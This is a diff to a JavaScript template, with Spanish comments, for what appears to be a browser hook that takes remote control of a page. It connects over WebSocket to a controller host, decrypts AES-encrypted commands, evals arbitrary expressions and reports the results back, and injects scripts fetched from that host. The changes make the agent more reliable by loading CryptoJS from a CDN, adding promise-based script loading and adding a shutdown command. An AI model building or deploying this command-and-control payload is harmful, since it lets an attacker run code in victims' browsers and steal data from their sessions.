@@ -8,15 +8,18 @@ function loadScriptFromURL(url) {
     if (!(/(http(s?)):\/\//i.test(url))) {
         url = "http://$hhost:$hport/" + url
     }
-    // Comprueba si el script existe, si existe devuelve true y carga una etiqueta script en el head del documento.
-    return fetch(url).then(response => {
-        if (response.ok) {
-            var node = document.createElement("script");
-            node.setAttribute("src", url);
-            document.getElementsByTagName("head")[0].appendChild(node);
-        }
-        return response.ok
-    })
+    // Return a promise that resolves when the script has actually loaded and executed
+    return new Promise((resolve, reject) => {
+        var script = document.createElement("script");
+        script.src = url;
+        script.onload = function() {
+            resolve(true);
+        };
+        script.onerror = function() {
+            reject(false);
+        };
+        document.getElementsByTagName("head")[0].appendChild(script);
+    });
 }
 function loadScript(script) {
     var node = document.createElement("script");
@@ -28,7 +31,19 @@ function loadScript(script) {
 const webSocket = new WebSocket("ws://$whost:$wport/$sid");
 
 webSocket.onopen = (event) => {
-    sendMessage({ type: 1 });
+    // Dynamically load CryptoJS from CDN
+    var cryptoScript = document.createElement("script");
+    cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
+    cryptoScript.onload = function() {
+        if (initCrypto()) {
+            sendMessage({ type: 1 });
+        }
+    };
+    cryptoScript.onerror = function() {
+        // Keep connection alive and report load failure through backend once possible.
+        console.error("CryptoJS could not be loaded from CDN.");
+    };
+    document.getElementsByTagName("head")[0].appendChild(cryptoScript);
 };
 
 /* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.
@@ -46,14 +61,27 @@ var _webs_Commands_ = {
         sendMessage({ type: 0, msg: { outputType: "console", text: eval(mes["expression"]) } })
     },
     "load": function (mes) {
-        loadScript(mes["script"]).then(ok => {
-            if (ok)
-                sendMessage({ type: 0, msg: { outputType: "info", text: "loaded" } })
-            else
-                sendMessage({ type: 0, msg: { outputType: "error", text: "could not load " + mes["script"] } })
-        })
+        var scriptContent = mes["script"];
+        // Check if it's a URL (starts with http or https)
+        if (/(http(s?)):\/\//i.test(scriptContent)) {
+            loadScriptFromURL(scriptContent)
+                .then(function(ok) {
+                    sendMessage({ type: 0, msg: { outputType: "info", text: "loaded" } })
+                })
+                .catch(function(err) {
+                    sendMessage({ type: 0, msg: { outputType: "error", text: "could not load " + scriptContent } })
+                })
+        } else {
+            // Treat as inline script code
+            loadScript(scriptContent);
+            sendMessage({ type: 0, msg: { outputType: "info", text: "loaded" } })
+        }
     },
-    "disable": function (mes) { }
+    "disable": function (mes) {
+        try {
+            webSocket.close();
+        } catch (e) { }
+    }
 }
 
 webSocket.onmessage = (event) => {
@@ -61,7 +89,13 @@ webSocket.onmessage = (event) => {
         const output = hex2a(decrypt(event.data));
         let mes = JSON.parse(output)
         _webs_Commands_[mes["Command"]](mes)
-    } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }) }
+    } catch (e) {
+        if (useCrypto) {
+            sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } })
+        } else {
+            console.error(e)
+        }
+    }
 
 };
 
@@ -69,19 +103,37 @@ webSocket.onmessage = (event) => {
 // Criptografía
 
 var secretKey = "$key";
-var derived_key = CryptoJS.enc.Base64.parse(secretKey);
+var derived_key = null;
+var useCrypto = false;
 
 // Initialize the initialization vector (IV) and encryption mode
-var iv = CryptoJS.enc.Hex.parse("$IV");
-var encryptionOptions = {
-    iv: iv,
-    mode: CryptoJS.mode.CBC
-};
+var iv = null;
+var encryptionOptions = null;
+
+function initCrypto() {
+    if (typeof CryptoJS === "undefined") {
+        return false;
+    }
+    derived_key = CryptoJS.enc.Base64.parse(secretKey);
+    iv = CryptoJS.enc.Hex.parse("$IV");
+    encryptionOptions = {
+        iv: iv,
+        mode: CryptoJS.mode.CBC
+    };
+    useCrypto = true;
+    return true;
+}
 
 function encrypt(plaintext) {
+    if (!useCrypto) {
+        throw new Error("Crypto engine not initialized yet.");
+    }
     return CryptoJS.AES.encrypt(plaintext, derived_key, encryptionOptions).toString();
 }
 function decrypt(plaintext) {
+    if (!useCrypto) {
+        throw new Error("Crypto engine not initialized yet.");
+    }
     return CryptoJS.AES.decrypt(plaintext, derived_key, encryptionOptions).toString();
 }
 
